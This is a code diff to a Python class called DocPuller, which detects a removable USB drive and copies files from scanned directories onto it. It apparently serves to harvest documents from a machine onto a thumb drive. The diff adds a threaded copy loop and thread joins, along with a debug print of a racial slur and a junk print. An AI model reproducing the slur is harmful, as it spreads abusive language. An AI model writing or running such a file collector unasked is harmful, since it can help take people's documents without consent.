@@ -30,6 +30,7 @@ class DocPuller:
         print('usbfound', self.usb_path)
         self.folder_name = ''
         self.copy_files = Queue()
+        self.running = True
 
     def get_usb_drive_letter(self):
         command = 'wmic logicaldisk where drivetype=2 get caption, volumename'
@@ -71,12 +72,14 @@ class DocPuller:
             os.mkdir(self.folder_name)
 
     def copy_file_to_usb(self):
-        if not self.copy_files.empty():
-            path = self.copy_files.get()
-            try:
-                shutil.copy2(path, self.usb_path + "\\" + self.folder_name)
-            except Exception as e:
-                print(e)
+        while self.running or not self.copy_files.empty():
+            if not self.copy_files.empty():
+                path = self.copy_files.get()
+                try:
+                    shutil.copy2(path, self.usb_path + "\\" + self.folder_name)
+                except Exception as e:
+                    print(e)
+        print('niggers')
 
     def scan_dir(self, dirs):
         path = f'{self.path}\\{dirs}'
@@ -91,6 +94,8 @@ class DocPuller:
     def scan_dirs(self):
         for dirs in self.directorys:
             self.scan_dir(dirs)
+        self.running = False
+        print("ASdfasdfadsfadfasdf")
 
     def init_docPuller(self):
         self.set_folder_name()
@@ -105,6 +110,9 @@ class DocPuller:
 
         scan_thread.start()
         copy_thread.start()
+
+        scan_thread.join()
+        copy_thread.join()
 
     def main(self):
         self.init_docPuller()
